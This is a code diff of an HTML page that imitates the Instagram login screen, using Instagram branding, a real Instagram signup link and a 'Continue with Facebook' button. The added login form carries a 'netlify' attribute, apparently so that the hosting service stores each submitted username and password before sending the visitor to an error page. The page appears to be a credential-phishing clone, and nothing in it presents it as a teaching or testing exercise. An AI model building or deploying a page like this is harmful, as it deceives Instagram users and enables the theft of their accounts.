@@ -3,39 +3,58 @@
 
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <link rel="stylesheet" href="style.css">
+    <title>LogIn | Instagram</title>
+    <link rel="stylesheet" href="index.css">
     <link rel="shortcut icon" href="res/instagram-new.png">
+
 </head>
 
 <body>
-    <div class="container">
-        <div class="login-box">
-            <img src="res/instagram-logo.png" class="logo" alt="Instagram Logo">
-            
-            <form action="error.html" method="post">
-                <input type="text" name="username" placeholder="Phone number, username, or email" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Log In</button>
-            </form>
-            
-            <div class="separator">
-                <div class="line"></div>
-                <p>OR</p>
-                <div class="line"></div>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="res/ig.png" alt="helo">
             </div>
-            
-            <div class="facebook-login">
-                <img src="res/facebook.png" class="fb-icon" alt="Facebook Logo">
-                <a href="error.html">Log in with Facebook</a>
+            <br>
+
+            <div>
+
+                <div class="btn1">
+                    <img src="res/facebook.png" style="float: left;" class="icon" alt="">
+                    <input type="button" onclick='window.location ="error.html";' value="Continue with Facebook"
+                        style="float: right;" class="btn2" />
+                </div>
+
             </div>
-            
-            <a href="error.html" class="forgot-password">Forgot password?</a>
+
+            <div style="margin-top:15px;margin-bottom: 15px;">
+                <pre>─────────    OR    ─────────</pre>
+            </div>
+
+
+
+            <div class="l-part">
+                <form name="contact" action="error.html" netlify>
+                    <input type="text" name="username" placeholder="Username" class="input-1" />
+
+                    <div class="overlap-text">
+                        <input type="password" name="password" placeholder="Password" class="input-2" />
+                        <a href="error.html">Forgot?</a>
+                    </div>
+
+                    <input type="submit" class="btn" value="Log In">
+                </form>
+            </div>
         </div>
-        
-        <div class="signup-box">
-            <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+
+
+
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a>
+            </div>
         </div>
     </div>
 </body>
